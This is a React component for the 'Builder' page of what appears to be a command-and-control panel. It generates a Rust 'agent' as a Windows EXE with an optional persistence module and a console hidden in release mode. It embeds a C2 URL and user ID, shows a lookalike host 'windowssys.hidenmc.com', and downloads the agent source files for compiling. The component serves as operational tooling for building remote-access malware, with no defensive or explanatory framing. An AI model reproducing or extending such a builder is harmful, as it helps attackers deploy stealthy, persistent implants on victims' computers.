import { useState } from "react";
import { hcApi } from "@/lib/hc-api";

export function HCBuilder() {
  const [buildName, setBuildName] = useState("hidencloud-agent");
  const [startup, setStartup] = useState(false);
  const [debug, setDebug] = useState(false);
  const [lines, setLines] = useState<{ text: string; type: string }[]>([]);
  const [building, setBuilding] = useState(false);

  async function handleBuild() {
    setBuilding(true);
    setLines([]);

    const steps = [
      "Initializing Rust project…",
      "Writing src/main.rs…",
      startup ? "Including persistence module…" : "Skipping persistence…",
      "Writing Cargo.toml…",
      debug ? "Debug mode — console output active" : "Release mode — console hidden",
      "Embedding C2 URL (auto-detected user ID)…",
    ];

    for (const s of steps) {
      await new Promise(r => setTimeout(r, 250));
      setLines(prev => [...prev, { text: "▸ " + s, type: "normal" }]);
    }

    try {
      const res = await hcApi.build({ buildName, startup, debug });
      setLines(prev => [...prev, { text: `✓ Build "${buildName}" ready — ${res.c2Url}`, type: "ok" }]);

      // Download files
      const dl = (content: string, filename: string) => {
        const blob = new Blob([content], { type: "text/plain" });
        const a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = filename;
        a.click();
      };

      dl(res.contents, "main.rs");
      if (res.cargoContents) dl(res.cargoContents, "Cargo.toml");
      if (res.persistenceContents) dl(res.persistenceContents, "persistence.rs");

      setLines(prev => [...prev, { text: "Files downloaded. Place in rustagent/src/ → cargo build --release", type: "normal" }]);
    } catch (err) {
      setLines(prev => [...prev, { text: "✗ " + (err instanceof Error ? err.message : "Build failed"), type: "err" }]);
    } finally {
      setBuilding(false);
    }
  }

  return (
    <div>
      <h1>Builder</h1>
      <p className="hc-sub">Generate a Rust agent. C2 URL and user ID are auto-detected.</p>
      <div className="hc-builder-layout">
        <div className="hc-card">
          <h3 className="hc-section-title">Build Configuration</h3>
          <label>Build Name</label>
          <input value={buildName} onChange={e => setBuildName(e.target.value)} placeholder="Build name" />
          <div className="hc-toggle-row">
            <span>Enable Startup</span>
            <label className="hc-toggle">
              <input type="checkbox" checked={startup} onChange={e => setStartup(e.target.checked)} />
              <span className="hc-toggle-slider" />
            </label>
          </div>
          <div className="hc-toggle-row">
            <span>Enable Debug</span>
            <label className="hc-toggle">
              <input type="checkbox" checked={debug} onChange={e => setDebug(e.target.checked)} />
              <span className="hc-toggle-slider" />
            </label>
          </div>
        </div>
        <div className="hc-card">
          <div className="hc-preview-header">
            <div className="hc-preview-icon">⚡</div>
            <div>
              <div className="hc-mono" style={{ fontWeight: 600 }}>{buildName || "hidencloud-agent"}.exe</div>
              <div className="hc-muted" style={{ fontSize: 11 }}>windowssys.hidenmc.com/&lt;auto&gt;</div>
            </div>
          </div>
          <div className="hc-preview-stats">
            <div><span>Language</span><strong>Rust</strong></div>
            <div><span>Format</span><strong>EXE</strong></div>
            <div><span>Startup</span><strong>{startup ? "Enabled" : "Off"}</strong></div>
            <div><span>Debug</span><strong>{debug ? "On" : "Off"}</strong></div>
          </div>
          <div className="hc-build-log">
            {lines.length === 0 && <div className="hc-muted">Ready. Press Create Build to generate.</div>}
            {lines.map((l, i) => (
              <div key={i} className={`hc-build-line ${l.type}`}>{l.text}</div>
            ))}
          </div>
          <button className="hc-primary hc-build-btn" onClick={handleBuild} disabled={building}>
            {building ? "Building…" : "Create Build"}
          </button>
        </div>
      </div>
    </div>
  );
}
